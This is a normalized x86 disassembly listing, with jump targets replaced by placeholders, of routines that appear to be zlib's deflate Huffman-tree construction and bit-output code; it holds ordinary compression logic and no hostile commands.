mov [ eax + 0x1698 ] ecx
retn
sub_3ae9860
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] ecx
mov ecx [ esp ]
mov ecx [ eax + ecx * 4 + 0xb54 ]
mov [ esp + 0x4 ] ecx
mov ecx [ esp + 0x4 ]
mov esi [ esp ]
add esi esi
lea ecx [ eax + ecx + 0x1450 ]
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x4 ]
lea ecx [ edx + ecx * 4 ]
jmp r-xdata
cmp esi [ eax + 0x1448 ]
jle r-xdata
cmp esi [ eax + 0x1448 ]
jge r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x4 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + esi * 4 + 0xb54 ]
mov bx [ edx + ebx * 4 ]
cmp bx [ ecx ]
ja r-xdata
mov ebx [ eax + esi * 4 + 0xb58 ]
mov edi [ eax + esi * 4 + 0xb54 ]
mov bx [ edx + ebx * 4 ]
cmp bx [ edx + edi * 4 ]
jb r-xdata
mov edi [ eax + esi * 4 + 0xb54 ]
mov bx [ edx + edi * 4 ]
cmp bx [ ecx ]
jne r-xdata
inc esi
mov ebx [ eax + esi * 4 + 0xb58 ]
mov edi [ eax + esi * 4 + 0xb54 ]
mov bx [ edx + ebx * 4 ]
cmp bx [ edx + edi * 4 ]
jne r-xdata
mov ebx [ esp ]
mov edi [ eax + esi * 4 + 0xb54 ]
mov [ eax + ebx * 4 + 0xb54 ] edi
mov [ esp ] esi
add esi esi
mov ebx [ esp + 0x8 ]
mov bl [ ebx ]
cmp bl [ eax + edi + 0x1450 ]
jbe r-xdata
mov ebx [ eax + esi * 4 + 0xb58 ]
mov edi [ eax + esi * 4 + 0xb54 ]
mov bl [ eax + ebx + 0x1450 ]
cmp bl [ eax + edi + 0x1450 ]
ja r-xdata
sub_3ae9954
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov [ esp ] eax
mov eax [ edx + 0x4 ]
mov esi [ edx ]
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x8 ]
xor edx edx
mov ecx [ eax ]
mov [ esp + 0x8 ] ecx
mov ecx [ eax + 0x4 ]
mov [ esp + 0xc ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x10 ] ecx
mov eax [ eax + 0x10 ]
mov [ esp + 0x20 ] edx
xor edx edx
mov ecx [ esp ]
add ecx 0xb34
mov [ ecx ] 0x0
inc edx
add ecx 0x2
cmp edx 0xf
jle r-xdata
mov edx [ esp ]
mov ecx [ esp ]
mov edx [ edx + 0x144c ]
mov edx [ ecx + edx * 4 + 0xb54 ]
mov [ esi + edx * 4 + 0x2 ] 0x0
mov ecx [ esp ]
mov edx [ ecx + 0x144c ]
inc edx
mov [ esp + 0x14 ] edx
cmp [ esp + 0x14 ] 0x23d
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
lea ecx [ ecx + edx * 4 + 0xb54 ]
jge r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
mov ebx [ ecx ]
movzx edx [ esi + ebx * 4 + 0x2 ]
movzx edx [ esi + edx * 4 + 0x2 ]
inc edx
cmp eax edx
jge r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax - 0x1 ]
mov ecx [ esp ]
lea ecx [ ecx + edx * 2 + 0xb34 ]
jmp r-xdata
mov [ esi + ebx * 4 + 0x2 ] dx
cmp ebx [ esp + 0x4 ]
jg r-xdata
mov edx eax
inc [ esp + 0x20 ]
cmp [ ecx ] 0x0
je r-xdata
inc [ esp + 0x14 ]
add ecx 0x4
cmp [ esp + 0x14 ] 0x23d
jl r-xdata
mov edi [ esp ]
inc [ edi + edx * 2 + 0xb34 ]
xor edi edi
mov [ esp + 0x18 ] edi
cmp ebx [ esp + 0x10 ]
jl r-xdata
dec edx
add ecx 0xfffffffe
mov ecx [ esp ]
dec [ ecx + edx * 2 + 0xb34 ]
mov ecx [ esp ]
add [ ecx + edx * 2 + 0xb36 ] 0x2
mov edx [ esp ]
dec [ edx + eax * 2 + 0xb34 ]
sub [ esp + 0x20 ] 0x2
cmp [ esp + 0x20 ] 0x0
jg r-xdata
mov di [ esi + ebx * 4 ]
mov [ esp + 0x1c ] di
movzx edi [ esp + 0x1c ]
add edx [ esp + 0x18 ]
imul edi edx
mov edx [ esp ]
add [ edx + 0x16a0 ] edi
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov edi ebx
sub edi [ esp + 0x10 ]
mov ebp [ esp + 0xc ]
mov edi [ ebp + edi * 4 ]
mov [ esp + 0x18 ] edi
mov edx eax
mov eax [ esp ]
test edx edx
lea ecx [ eax + edx * 2 + 0xb34 ]
mov [ esp + 0x24 ] ecx
je r-xdata
mov edx [ esp + 0x8 ]
movzx edx [ edx + ebx * 4 + 0x2 ]
add edx [ esp + 0x18 ]
movzx ebx [ esp + 0x1c ]
imul edx ebx
mov ebx [ esp ]
add [ ebx + 0x16a4 ] edx
mov eax [ esp + 0x24 ]
movzx ebx [ eax ]
dec edx
add [ esp + 0x24 ] 0xfffffffe
test edx edx
jne r-xdata
dec [ esp + 0x14 ]
add eax 0xfffffffc
mov ecx [ eax ]
cmp ecx [ esp + 0x4 ]
jg r-xdata
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
lea eax [ eax + ecx * 4 + 0xb54 ]
test ebx ebx
je r-xdata
movzx edi [ esi + ecx * 4 + 0x2 ]
cmp edx edi
je r-xdata
dec ebx
test ebx ebx
jne r-xdata
movzx edi [ esi + ecx * 4 + 0x2 ]
mov ebp edx
sub ebp edi
movzx edi [ esi + ecx * 4 ]
imul ebp edi
mov edi [ esp ]
add [ edi + 0x16a0 ] ebp
mov [ esi + ecx * 4 + 0x2 ] dx
sub_3ae9b54
push ebx
push esi
push edi
add esp 0xffffffd8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
xor esi esi
mov ecx 0x1
lea ebx [ esp + 0xa ]
mov edx [ esp + 0x4 ]
mov di [ edx ]
add edx 0x2
add di si
inc ecx
add edi edi
mov [ ebx ] di
add ebx 0x2
cmp ecx 0xf
mov esi edi
jle r-xdata
xor edi edi
lea ebx [ eax + 0x2 ]
cmp edi [ esp ]
jg r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
movzx esi [ ebx ]
test esi esi
je r-xdata
inc edi
add ebx 0x4
cmp edi [ esp ]
jle r-xdata
mov ax [ esp + esi * 2 + 0x8 ]
inc [ esp + esi * 2 + 0x8 ]
movzx eax ax
mov edx esi
call sub_3aeb440
mov [ ebx - 0x2 ] ax
sub_3ae9bc4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
xor esi esi
mov [ esp ] edx
mov eax [ esp ]
mov ebp [ eax ]
mov eax [ esp ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ esp + 0x4 ] edx
lea edx [ ebx + 0x1450 ]
mov ecx [ eax + 0xc ]
xor eax eax
mov [ esp + 0x8 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov [ ebx + 0x1448 ] eax
mov eax ebp
mov [ ebx + 0x144c ] 0x23d
cmp esi [ esp + 0x8 ]
jge r-xdata
cmp [ ebx + 0x1448 ] 0x2
jl r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0x2
jge r-xdata
mov ecx [ esp ]
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
mov esi [ ebx + 0x1448 ]
sar esi 0x1
jns r-xdata
mov [ eax + 0x2 ] 0x0
mov [ esp + 0xc ] esi
inc [ ebx + 0x1448 ]
mov ecx [ ebx + 0x1448 ]
mov [ ebx + ecx * 4 + 0xb54 ] esi
mov [ edx ] 0x0
jmp r-xdata
xor eax eax
inc [ esp + 0xc ]
mov eax [ esp + 0xc ]
jmp r-xdata
cmp esi 0x1
jl r-xdata
adc esi 0x0
jmp r-xdata
inc esi
inc edx
add eax 0x4
cmp esi [ esp + 0x8 ]
jl r-xdata
mov eax [ esp + 0x4 ]
movzx edx [ eax + edi * 4 + 0x2 ]
sub [ ebx + 0x16a4 ] edx
inc [ ebx + 0x1448 ]
mov edi eax
mov edx [ ebx + 0x1448 ]
mov [ ebx + edx * 4 + 0xb54 ] eax
mov [ ebp + edi * 4 ] 0x1
mov [ ebx + edi + 0x1450 ] 0x0
dec [ ebx + 0x16a0 ]
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov edi [ esp + 0x8 ]
mov ecx esi
mov edx ebp
mov eax ebx
call sub_3ae9860
dec esi
cmp esi 0x1
jge r-xdata
mov cl [ ebx + eax + 0x1450 ]
mov cl [ ebx + esi + 0x1450 ]
jmp r-xdata
mov eax [ ebx + 0x1448 ]
mov esi [ ebx + 0xb58 ]
add [ ebx + 0x1448 ] 0xffffffff
mov edx [ ebx + eax * 4 + 0xb54 ]
mov eax ebx
mov [ ebx + 0xb58 ] edx
mov edx ebp
mov ecx 0x1
call sub_3ae9860
mov eax [ ebx + 0xb58 ]
dec [ ebx + 0x144c ]
mov edx [ ebx + 0x144c ]
mov [ ebx + edx * 4 + 0xb54 ] esi
dec [ ebx + 0x144c ]
mov ecx [ ebx + 0x144c ]
mov [ ebx + ecx * 4 + 0xb54 ] eax
mov dx [ ebp + eax * 4 ]
add dx [ ebp + esi * 4 ]
push edx
pop ecx
mov [ ebp + edi * 4 ] cx
mov dl [ ebx + eax + 0x1450 ]
cmp dl [ ebx + esi + 0x1450 ]
ja r-xdata
dec [ ebx + 0x144c ]
mov eax [ ebx + 0x144c ]
mov edx [ ebx + 0xb58 ]
mov [ ebx + eax * 4 + 0xb54 ] edx
mov eax ebx
mov edx [ esp ]
call sub_3ae9954
lea ecx [ ebx + 0xb34 ]
mov edx [ esp + 0xc ]
mov eax ebp
call sub_3ae9b54
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc ecx
mov edx ebp
mov [ ebx + edi + 0x1450 ] cl
mov ecx 0x1
mov [ ebp + eax * 4 + 0x2 ] di
mov eax ebx
mov [ ebp + esi * 4 + 0x2 ] di
mov [ ebx + 0xb58 ] edi
inc edi
call sub_3ae9860
cmp [ ebx + 0x1448 ] 0x2
jge r-xdata
sub_3ae9dd4
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov [ esp + 0xc ] 0xffffffff
movzx ebx [ edx + 0x2 ]
xor esi esi
mov ecx 0x7
mov eax 0x4
test ebx ebx
jne r-xdata
mov edi [ esp + 0x4 ]
mov [ edx + edi * 4 + 0x6 ] 0xffff
xor edi edi
add edx 0x6
mov [ esp + 0x8 ] edi
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0x4 ]
jg r-xdata
mov ecx 0x8a
mov eax 0x3
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov ebx [ esp + 0x10 ]
inc esi
movzx ebx [ ebx ]
cmp ecx esi
jle r-xdata
cmp eax esi
jle r-xdata
cmp ebx edx
je r-xdata
test edx edx
je r-xdata
mov eax [ esp ]
add [ eax + edx * 4 + 0xa74 ] si
jmp r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x10 ] 0x4
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0x4 ]
jle r-xdata
cmp esi 0xa
jg r-xdata
cmp edx [ esp + 0xc ]
je r-xdata
xor esi esi
mov [ esp + 0xc ] edx
test ebx ebx
jne r-xdata
mov eax [ esp ]
inc [ eax + 0xabc ]
mov ecx [ esp ]
inc [ ecx + 0xab8 ]
jmp r-xdata
mov eax [ esp ]
inc [ eax + 0xab4 ]
jmp r-xdata
mov ecx [ esp ]
inc [ ecx + edx * 4 + 0xa74 ]
cmp ebx edx
jne r-xdata
mov ecx 0x8a
mov eax 0x3
jmp r-xdata
mov ecx 0x7
mov eax 0x4
mov ecx 0x6
mov eax 0x3
jmp r-xdata
sub_3ae9edc
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
xor ebx ebx
mov edi 0x4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ecx 0x7
mov [ esp + 0xc ] 0xffffffff
mov edx [ esp ]
movzx esi [ edx + 0x2 ]
test esi esi
jne r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov edx [ esp ]
add edx 0x6
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0x4 ]
jg r-xdata
mov ecx 0x8a
mov edi 0x3
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov esi [ esp + 0x24 ]
inc ebx
movzx esi [ esi ]
cmp ecx ebx
jle r-xdata
cmp edi ebx
jle r-xdata
cmp esi edx
je r-xdata
test edx edx
je r-xdata
movzx edi [ eax + edx * 4 + 0xa76 ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x24 ] 0x4
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0x4 ]
jle r-xdata
cmp ebx 0xa
jg r-xdata
cmp edx [ esp + 0xc ]
je r-xdata
mov bp [ eax + edx * 4 + 0xa74 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
add [ eax + 0x16b4 ] edi
movzx ecx [ eax + edx * 4 + 0xa74 ]
mov [ esp + 0x10 ] ecx
sub edi 0x10
mov bp [ esp + 0x10 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
movzx ebp [ esp + 0x10 ]
sub ecx [ eax + 0x16b4 ]
sar ebp cl
mov [ eax + 0x16b0 ] bp
add edi [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] edi
jmp r-xdata
movzx edi [ eax + 0xabe ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
movzx edi [ eax + 0xaba ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
movzx edi [ eax + 0xab6 ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
movzx edi [ eax + edx * 4 + 0xa76 ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
jmp r-xdata
dec ebx
jne r-xdata
mov bp [ eax + 0xabc ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
add [ eax + 0x16b4 ] edi
movzx ecx [ eax + 0xabc ]
mov [ esp + 0x20 ] ecx
sub edi 0x10
mov bp [ esp + 0x20 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
movzx ebp [ esp + 0x20 ]
sub ecx [ eax + 0x16b4 ]
sar ebp cl
mov [ eax + 0x16b0 ] bp
add edi [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] edi
jmp r-xdata
mov bp [ eax + 0xab8 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
add [ eax + 0x16b4 ] edi
movzx ecx [ eax + 0xab8 ]
mov [ esp + 0x1c ] ecx
sub edi 0x10
mov bp [ esp + 0x1c ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
movzx ebp [ esp + 0x1c ]
sub ecx [ eax + 0x16b4 ]
sar ebp cl
mov [ eax + 0x16b0 ] bp
add edi [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] edi
jmp r-xdata
mov bp [ eax + 0xab4 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
add [ eax + 0x16b4 ] edi
movzx ecx [ eax + 0xab4 ]
mov [ esp + 0x18 ] ecx
sub edi 0x10
mov bp [ esp + 0x18 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
movzx ebp [ esp + 0x18 ]
sub ecx [ eax + 0x16b4 ]
sar ebp cl
mov [ eax + 0x16b0 ] bp
add edi [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] edi
jmp r-xdata
mov bp [ eax + edx * 4 + 0xa74 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
add [ eax + 0x16b4 ] edi
movzx ecx [ eax + edx * 4 + 0xa74 ]
mov [ esp + 0x14 ] ecx
sub edi 0x10
mov bp [ esp + 0x14 ]
mov ecx [ eax + 0x16b4 ]
shl bp cl
or [ eax + 0x16b0 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
movzx ebp [ esp + 0x14 ]
sub ecx [ eax + 0x16b4 ]
sar ebp cl
mov [ eax + 0x16b0 ] bp
add edi [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] edi
jmp r-xdata
xor ebx ebx
mov [ esp + 0xc ] edx
test esi esi
jne r-xdata
add bx 0xfff5
mov ecx [ eax + 0x16b4 ]
shl bx cl
or [ eax + 0x16b0 ] bx
add [ eax + 0x16b4 ] edi
add ebx 0xfffffff5
mov ecx [ eax + 0x16b4 ]
mov ebp ebx
sub edi 0x10
shl bp cl
or [ eax + 0x16b0 ] bp
movzx ebx bx
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar ebx cl
mov [ eax + 0x16b0 ] bx
add edi [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] edi
jmp r-xdata
mov edi 0x7
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
add bx 0xfffd
mov ecx [ eax + 0x16b4 ]
shl bx cl
or [ eax + 0x16b0 ] bx
add [ eax + 0x16b4 ] edi
jmp r-xdata
add ebx 0xfffffffd
mov ecx [ eax + 0x16b4 ]
mov ebp ebx
sub edi 0x10
shl bp cl
or [ eax + 0x16b0 ] bp
movzx ebx bx
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar ebx cl
mov [ eax + 0x16b0 ] bx
add edi [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] edi
jmp r-xdata
mov edi 0x3
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
add bx 0xfffd
mov ecx [ eax + 0x16b4 ]
shl bx cl
or [ eax + 0x16b0 ] bx
add [ eax + 0x16b4 ] edi
jmp r-xdata
add ebx 0xfffffffd
mov ecx [ eax + 0x16b4 ]
mov ebp ebx
sub edi 0x10
shl bp cl
or [ eax + 0x16b0 ] bp
movzx ebx bx
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b0 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b0 ]
pop ebp
sar ecx 0x8
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar ebx cl
mov [ eax + 0x16b0 ] bx
add edi [ eax + 0x16b4 ]
mov [ eax + 0x16b4 ] edi
jmp r-xdata
mov edi 0x2
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b4 ]
jge r-xdata
dec ebx
cmp esi edx
jne r-xdata
mov ecx 0x8a
mov edi 0x3
jmp r-xdata
mov ecx 0x7
mov edi 0x4
mov ecx 0x6
mov edi 0x3
jmp r-xdata
sub_3aea560
push ebx
mov ebx eax
lea edx [ ebx + 0x8c ]
mov ecx [ ebx + 0xb14 ]
mov eax ebx
call sub_3ae9dd4
lea edx [ ebx + 0x980 ]
mov ecx [ ebx + 0xb20 ]
mov eax ebx
call sub_3ae9dd4
lea edx [ ebx + 0xb28 ]
mov eax ebx
call sub_3ae9bc4
mov eax 0x12
mov edx rw-data
lea edx [ eax + eax * 2 ]
add edx 0x11
add [ ebx + 0x16a0 ] edx
pop ebx
retn
dec eax
dec edx
cmp eax 0x3
jge r-xdata
xor ecx ecx
mov cl [ edx ]
cmp [ ebx + ecx * 4 + 0xa76 ] 0x0
jne r-xdata
sub_3aea5c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax 0x5
mov edx 0x10
sub edx eax
mov esi [ ebx + 0x16b4 ]
cmp edx esi
jge r-xdata
mov dx [ ebp - 0x4 ]
mov ecx [ ebx + 0x16b4 ]
add dx 0xfeff
shl dx cl
or [ ebx + 0x16b0 ] dx
add [ ebx + 0x16b4 ] eax
mov edx [ ebp - 0x4 ]
mov ecx esi
add edx 0xfffffeff
sub eax 0x10
mov esi edx
shl si cl
or [ ebx + 0x16b0 ] si
movzx edx dx
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b0 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b0 ]
pop esi
sar ecx 0x8
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b4 ]
sar edx cl
mov [ ebx + 0x16b0 ] dx
add eax [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] eax
jmp r-xdata
mov dx [ ebp - 0x8 ]
mov ecx [ ebx + 0x16b4 ]
add dx 0xffff
shl dx cl
or [ ebx + 0x16b0 ] dx
add [ ebx + 0x16b4 ] eax
mov edx [ ebp - 0x8 ]
mov ecx esi
dec edx
sub eax 0x10
mov esi edx
shl si cl
or [ ebx + 0x16b0 ] si
movzx edx dx
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b0 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b0 ]
pop esi
sar ecx 0x8
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b4 ]
sar edx cl
mov [ ebx + 0x16b0 ] dx
add eax [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] eax
jmp r-xdata
mov eax 0x5
mov edx 0x10
sub edx eax
mov esi [ ebx + 0x16b4 ]
cmp edx esi
jge r-xdata
mov dx [ ebp + 0x8 ]
mov ecx [ ebx + 0x16b4 ]
add dx 0xfffc
shl dx cl
or [ ebx + 0x16b0 ] dx
add [ ebx + 0x16b4 ] eax
mov edx [ ebp + 0x8 ]
mov ecx esi
add edx 0xfffffffc
sub eax 0x10
mov esi edx
shl si cl
or [ ebx + 0x16b0 ] si
movzx edx dx
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b0 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b0 ]
pop esi
sar ecx 0x8
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b4 ]
sar edx cl
mov [ ebx + 0x16b0 ] dx
add eax [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] eax
jmp r-xdata
mov eax 0x4
mov edx 0x10
sub edx eax
mov esi [ ebx + 0x16b4 ]
cmp edx esi
jge r-xdata
mov ecx [ ebp - 0x4 ]
dec ecx
lea edx [ ebx + 0x8c ]
mov eax ebx
call sub_3ae9edc
mov ecx [ ebp - 0x8 ]
dec ecx
lea edx [ ebx + 0x980 ]
mov eax ebx
call sub_3ae9edc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi 0x3
mov ecx 0x10
sub ecx esi
cmp ecx [ ebx + 0x16b4 ]
jge r-xdata
xor edx edx
mov eax rw-data
cmp edx [ ebp + 0x8 ]
jge r-xdata
movzx edi [ eax ]
mov ecx [ ebx + 0x16b4 ]
mov di [ ebx + edi * 4 + 0xa76 ]
shl di cl
or [ ebx + 0x16b0 ] di
add [ ebx + 0x16b4 ] esi
xor ecx ecx
sub esi 0x10
mov cl [ eax ]
movzx ecx [ ebx + ecx * 4 + 0xa76 ]
mov [ ebp - 0xc ] ecx
mov di [ ebp - 0xc ]
mov ecx [ ebx + 0x16b4 ]
shl di cl
or [ ebx + 0x16b0 ] di
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
pop edi
mov cl [ ebx + 0x16b0 ]
and cl 0xff
mov [ edi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b0 ]
pop edi
sar ecx 0x8
mov [ edi ] cl
mov ecx 0x10
movzx edi [ ebp - 0xc ]
sub ecx [ ebx + 0x16b4 ]
sar edi cl
mov [ ebx + 0x16b0 ] di
add esi [ ebx + 0x16b4 ]
mov [ ebx + 0x16b4 ] esi
jmp r-xdata
inc edx
inc eax
cmp edx [ ebp + 0x8 ]
jl r-xdata
sub_3aea8bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi [ ebp + 0x8 ]
mov ebx 0x3
mov ecx 0x10
sub ecx ebx
mov edx [ eax + 0x16b4 ]
cmp ecx edx
jge r-xdata
mov ecx [ eax + 0x16b4 ]
shl si cl
or [ eax + 0x16b0 ] si
add [ eax + 0x16b4 ] ebx
mov ecx edx
mov edx esi
shl dx cl
or [ eax + 0x16b0 ] dx
sub ebx 0x10
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
lea edx [ ecx + edx ]
push edx
pop edx
mov cl [ eax + 0x16b0 ]
